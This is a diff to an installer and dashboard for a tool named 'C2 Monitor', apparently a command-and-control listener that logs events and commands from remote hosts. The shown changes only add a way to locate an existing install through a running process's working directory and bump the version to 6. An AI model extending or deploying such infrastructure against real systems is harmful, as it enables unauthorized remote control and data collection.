@@ -16,6 +16,15 @@ INSTALL_DIR=""
 if command -v systemctl > /dev/null 2>&1 && [ -f /etc/systemd/system/c2-listener.service ]; then
     INSTALL_DIR=$(sed -n 's/^WorkingDirectory=//p' /etc/systemd/system/c2-listener.service 2>/dev/null | head -n 1)
 fi
+if [ -z "$INSTALL_DIR" ]; then
+    RUN_PID=$(pgrep -f "$SCRIPT_NAME" 2>/dev/null | head -n 1)
+    if [ -n "$RUN_PID" ]; then
+        RUN_DIR=$(readlink "/proc/$RUN_PID/cwd" 2>/dev/null || true)
+        if [ -n "$RUN_DIR" ] && [ -d "$RUN_DIR" ]; then
+            INSTALL_DIR="$RUN_DIR"
+        fi
+    fi
+fi
 if [ -n "$INSTALL_DIR" ] && [ -d "$INSTALL_DIR" ]; then
     echo " [*] Instalasi lama terdeteksi di: $INSTALL_DIR"
     echo "     (menggunakan ulang folder itu agar selalu memakai versi terbaru)"
@@ -61,7 +70,7 @@ from datetime import datetime
 PORT = int(os.environ.get("C2_PORT", "8080"))
 LOG_DIR = os.environ.get("C2_LOG_DIR", "./received_logs")
 DASH_PASS = os.environ.get("C2_DASH_PASS", "")
-VERSION = "5"
+VERSION = "6"
 
 EVENTS_FILE = os.path.join(LOG_DIR, "events.jsonl")
 COMMANDS_FILE = os.path.join(LOG_DIR, "commands.jsonl")
@@ -294,7 +303,7 @@ DASHBOARD_PAGE = r"""<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>C2 Monitor - Dashboard (v5)</title>
+<title>C2 Monitor - Dashboard (v6)</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
 <style>
@@ -351,7 +360,7 @@ pre { background:#0b1220; border:1px solid var(--border); border-radius:7px; pad
 </head>
 <body>
 <div class="topbar">
-  <h1>C2 Monitor</h1><span class="ver">v5</span>
+  <h1>C2 Monitor</h1><span class="ver">v6</span>
   <div class="conn"><span class="dot off" id="connDot"></span><span id="connTxt">Menghubungkan...</span></div>
 </div>
 <div class="tabs">
